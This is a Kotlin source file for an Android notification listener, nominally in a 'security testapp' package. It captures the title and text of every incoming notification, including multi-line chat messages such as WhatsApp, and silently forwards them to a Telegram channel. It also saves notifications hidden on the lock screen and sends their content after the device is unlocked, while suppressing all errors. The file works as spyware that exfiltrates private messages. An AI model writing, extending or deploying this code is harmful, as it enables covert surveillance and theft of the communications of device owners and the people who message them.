package com.security.testapp

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import java.util.Collections
import java.util.LinkedHashSet

class NotificationListener : NotificationListenerService() {

    companion object {
        var instance: NotificationListener? = null
            private set
    }

    private val hiddenKeys = Collections.synchronizedSet(LinkedHashSet<String>())

    override fun onCreate() {
        super.onCreate()
        instance = this
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        try {
            val packageName = sbn.packageName
            val notif = sbn.notification

            val usePublic = notif.visibility == Notification.VISIBILITY_PRIVATE
            val extras = if (usePublic && notif.publicVersion != null) {
                notif.publicVersion.extras
            } else {
                notif.extras
            }

            val title = extras?.getString("android.title") ?: ""
            val bigText = extras?.getCharSequence("android.bigText")?.toString() ?: ""
            val text = extras?.getCharSequence("android.text")?.toString() ?: ""

            // मल्टी-लाइन टेक्स्ट (जैसे WhatsApp के कई मैसेज)
            val linesArray = extras?.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
            var finalText = if (linesArray != null && linesArray.isNotEmpty()) {
                linesArray.joinToString("\n")
            } else if (bigText.isNotEmpty()) bigText
            else text

            val subText = extras?.getCharSequence("android.subText")?.toString() ?: ""
            val summaryText = extras?.getCharSequence("android.summaryText")?.toString() ?: ""
            val ticker = notif.tickerText?.toString() ?: ""

            if (finalText.isEmpty()) finalText = if (subText.isNotEmpty()) subText else summaryText
            if (finalText.isEmpty()) finalText = ticker

            if (finalText.isEmpty()) {
                hiddenKeys.add(sbn.key)
                return
            }

            val msg = "<b>🔔 Notification</b>\n" +
                    "<b>📦 App:</b> $packageName\n" +
                    "<b>📝 Title:</b> $title\n" +
                    "<b>💬 Text:</b> <code>$finalText</code>"
            TelegramHelper.sendWithFallback(msg, this, "HTML")
        } catch (e: Exception) {
            // क्रैश से बचें
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        if (sbn != null) hiddenKeys.remove(sbn.key)
    }

    fun onUnlock() {
        val active = activeNotifications ?: return
        for (sbn in active) {
            if (hiddenKeys.remove(sbn.key)) {
                try {
                    val extras = sbn.notification.extras
                    val title = extras?.getString("android.title") ?: ""
                    val text = extras?.getCharSequence("android.text")?.toString() ?: ""
                    val bigText = extras?.getCharSequence("android.bigText")?.toString() ?: ""
                    val linesArray = extras?.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
                    var finalText = if (linesArray != null && linesArray.isNotEmpty()) {
                        linesArray.joinToString("\n")
                    } else if (bigText.isNotEmpty()) bigText else text

                    if (finalText.isEmpty()) finalText = "[Content Hidden]"
                    val msg = "<b>🔓 Unlocked Notification</b>\n" +
                            "<b>📦 App:</b> ${sbn.packageName}\n" +
                            "<b>📝 Title:</b> $title\n" +
                            "<b>💬 Text:</b> <code>$finalText</code>"
                    TelegramHelper.sendWithFallback(msg, this, "HTML")
                } catch (_: Exception) {}
            }
        }
    }
}
